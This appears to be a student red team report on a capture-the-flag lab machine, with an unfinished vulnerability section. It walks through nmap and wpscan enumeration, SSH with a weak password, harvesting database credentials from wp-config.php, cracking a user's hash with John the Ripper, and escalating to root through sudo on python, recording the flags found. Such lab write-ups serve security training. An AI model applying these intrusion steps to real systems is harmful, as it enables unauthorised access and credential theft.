# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services

Nmap scan results for each machine reveal the below services and OS details:

```bash
$ nmap -sV -O 192.168.1.110/24
  
  Nmap scan report for 192.168.1.110
  Host is up (0.0088s latency)
  Not shown: 995 closed ports
  PORT      STATE  SERVICE         VERSION
  22/tcp    open   ssh             OpenSSH 6.7p1 Debian 5_deb8u4 (protocol 2.0)
  80/tcp    open   http            Apache httpd 2.4.10 ((Debian))
  111/tcp   open   rpcbind         2-4 (RPC #100000)
  139/tcp   open   netbios-ssn     Samba smdb 3.X - 4.X (workgroup: WORKGROUP)
  445/tcp   open   netbios-ssn     Samba smdb 3.X - 4.X (workgroup: WORKGROUP)
  MAC Address: 00:15:5D:00:04:11 (Microsoft)
  Running: Linux 3.X|4.X
  OS CPE: cpe:/o:/linux:linux_kernel:3  cpe:/o:linux;linux_kernel:4
  OS details: LInux 3.2 - 4.9
```

This scan identifies the services below as potential points of entry:
- Target 1
  - ssh (port 22)
  - http (port 80)
  - rpcbind (port 111)
  - netbios-ssn (port 139)
  - netbios-ssn (port 445)


_TODO: Fill out the list below. Include severity, and CVE numbers, if possible._

The following vulnerabilities were identified on each target:
- Target 1
  - List of
  - Critical
  - Vulnerabilities

_TODO: Include vulnerability scan results to prove the identified vulnerabilities._

### Exploitation

The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
- Target 1
  - `flag1.txt`: flag1{b9bbcb33e11b80be759c4e844862482d}
    - **Exploit Used**
      - wpscan was able to identify two users on the Word Press website hosted by the webserver.
        - wpscan –-url http://192.168.1.110/wordpress -e
        ![Wordpress Users](/images/wpscan-users.PNG)
      - Then, we simply attempted to ssh as these users into the machine. This proved simple, as Michael's password is michael.
        - ssh michael@192.168.1.110
          ![Successful ssh](/images/ssh-michael.PNG)
      - flag 1 was found inside /var/www/html
        - cd /var/www
        - grep -R flag html
          ![flag1](/images/flag1.PNG)
  - `flag2.txt`: flag2{fc3fd58dcdad9ab23faca6e9a36e851c}
    - **Exploit Used**
      - While connected in as michael, flag 2 was found in the website's root directory.
        - found using find / -type f -iname *flag* 2>/dev/null
        - cat /var/www/flag2.txt
          ![flag2](/images/flag2.PNG)
  - `flag3` : flag3{afc01ab56b50591e7dccf93122770cd2}
    - **Exploit Used**
      - The wordpress configuration files contained the same login and password info that is still in use. 
        - cat /var/www/html/wordpress/wp-config.php
          ![wp-config credentials](/images/mysql-logins.PNG)
      - Using those, we could log into MySQL as root.
        - mysql -u root -p

          ![Into MySQL](/images/mysql-in.PNG)
      - Flag 3 was located in the wp_posts table in the wordpress database. We got there with:
        - show databases;
        - use wordpress;
        - show tables;
        - select * from wp_posts;
          ![Flag3](/images/flag3.PNG)
  - `flag4` : flag4{715dea6c055b9fe3337544932f2941ce}
    - **Exploit Used**
      - Flag 4 was found by using ssh to log in as steven, and escalating privileges to root.
      - First, we grabbed the password hash for steven from the MySQL table wp_users
        - ![SQL Users](/images/wp-sql-users.PNG)
      - We cracked that on our Kali machine using John the Ripper, giving us his password, which is pink84.
      - steven has sudo privileges for python, so we used that to escalate our privileges to root. AS root, we found flag 4 in /root. (Below is a pic retracing the steps taken.)
        - ![Gaining root and finding flag 4](/images/gaining-flag4.PNG)
        - ![Flag 4](/images/flag4.PNG)
  - With that, all 4 flags have been found.
